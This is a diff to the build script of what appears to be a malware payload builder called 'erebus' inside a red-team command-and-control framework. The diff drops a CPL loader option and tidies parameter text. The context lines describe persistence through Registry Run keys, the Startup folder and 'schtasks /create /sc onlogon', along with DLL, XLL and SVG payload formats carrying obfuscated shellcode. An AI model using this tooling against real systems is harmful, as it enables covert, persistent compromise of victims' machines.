@@ -1920,10 +1920,10 @@ generated if none have been entered.""",
                 "Copy the loader to a permanent location and register a persistence mechanism "
                 "so it survives reboot. The copy is made BEFORE the loader is spawned.\n\n"
                 "Supported methods (select via 3.P1):\n"
-                "  Registry Run Key   — HKCU\\...\\Run (every login)\n"
-                "  Registry RunOnce   — HKCU\\...\\RunOnce (next login only)\n"
-                "  Startup Folder     — %APPDATA%\\...\\Startup\\\n"
-                "  Scheduled Task     — schtasks /sc onlogon /rl limited"
+                "  Registry Run Key   - HKCU\\...\\Run (every login)\n"
+                "  Registry RunOnce   - HKCU\\...\\RunOnce (next login only)\n"
+                "  Startup Folder     - %APPDATA%\\...\\Startup\\\n"
+                "  Scheduled Task     - schtasks /sc onlogon /rl limited"
             ),
             default_value = False,
             hide_conditions = [
@@ -1935,10 +1935,10 @@ generated if none have been entered.""",
             parameter_type = BuildParameterType.ChooseOne,
             description = (
                 "Persistence mechanism to register after install:\n"
-                "  Registry Run Key   — HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n"
-                "  Registry RunOnce   — same key but RunOnce (single invocation)\n"
-                "  Startup Folder     — copies loader/BAT wrapper to shell:startup\n"
-                "  Scheduled Task     — schtasks /create /sc onlogon /rl limited"
+                "  Registry Run Key   - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n"
+                "  Registry RunOnce   - same key but RunOnce (single invocation)\n"
+                "  Startup Folder     - copies loader/BAT wrapper to shell:startup\n"
+                "  Scheduled Task     - schtasks /create /sc onlogon /rl limited"
             ),
             choices = ["Registry Run Key", "Registry RunOnce", "Startup Folder", "Scheduled Task"],
             default_value = "Registry Run Key",
@@ -1966,8 +1966,8 @@ generated if none have been entered.""",
             parameter_type = BuildParameterType.ChooseOne,
             description = (
                 "Base directory where the loader is copied before persistence is registered.\n"
-                "  %APPDATA%      — C:\\Users\\<user>\\AppData\\Roaming\\<name>\\\n"
-                "  %LOCALAPPDATA% — C:\\Users\\<user>\\AppData\\Local\\<name>\\"
+                "  %APPDATA%      - C:\\Users\\<user>\\AppData\\Roaming\\<name>\\\n"
+                "  %LOCALAPPDATA% - C:\\Users\\<user>\\AppData\\Local\\<name>\\"
             ),
             choices = ["%APPDATA%", "%LOCALAPPDATA%"],
             default_value = "%APPDATA%",
@@ -2392,9 +2392,6 @@ generated if none have been entered.""",
 
         BuildStep(step_name = "[T1027.011] - Compiling DLL Payload",
                   step_description = "Compiling DLL Payload with Hijacked Info & Obfuscated Shellcode"),
-
-        BuildStep(step_name = "[T1218.002] - Compiling CPL Payload",
-                  step_description = "Compiling CPL Applet with Obfuscated Shellcode"),
 
         BuildStep(step_name = "[T1559.002] - Compiling XLL Add-In",
                   step_description = "Compiling XLL Add-In DLL with Obfuscated Shellcode"),
@@ -3260,7 +3257,7 @@ generated if none have been entered.""",
                 dirs_exist_ok=True,
                 ignore=shutil.ignore_patterns(
                     "*.o", "*.obj",
-                    "erebus.exe", "erebus.dll", "erebus.cpl", "erebus.xll",
+                    "erebus.exe", "erebus.dll", "erebus.xll",
                     "erebus_test*", "erebus_guardrails_test*", "erebus_injection_test*",
                     "__pycache__",
                 ),
@@ -3978,9 +3975,6 @@ generated if none have been entered.""",
                         if loader_format == "dll":
                             compile_step_name = "[T1027.011] - Compiling DLL Payload"
                             compile_step_msg = "DLL Loader Compiled!"
-                        elif loader_format == "cpl":
-                            compile_step_name = "[T1218.002] - Compiling CPL Payload"
-                            compile_step_msg = "CPL Loader Compiled!"
                         elif loader_format == "xll":
                             compile_step_name = "[T1559.002] - Compiling XLL Add-In"
                             compile_step_msg = "XLL Add-In Compiled!"
@@ -4943,7 +4937,7 @@ static size_t key_len = sizeof(key);
                             # Find the compiled payload in the payload directory
                             payload_exe = payload_dir / "erebus.exe"
                             if not payload_exe.exists():
-                                for ext in ["dll", "cpl", "xll"]:
+                                for ext in ["dll", "xll"]:
                                     candidate = payload_dir / f"erebus.{ext}"
                                     if candidate.exists():
                                         payload_exe = candidate
@@ -5010,7 +5004,7 @@ static size_t key_len = sizeof(key);
 
                         case "SVG":
                             _svg_exe = payload_dir / "erebus.exe"
-                            for _ext in ("dll", "cpl", "xll"):
+                            for _ext in ("dll", "xll"):
                                 _cand = payload_dir / f"erebus.{_ext}"
                                 if _cand.exists():
                                     _svg_exe = _cand
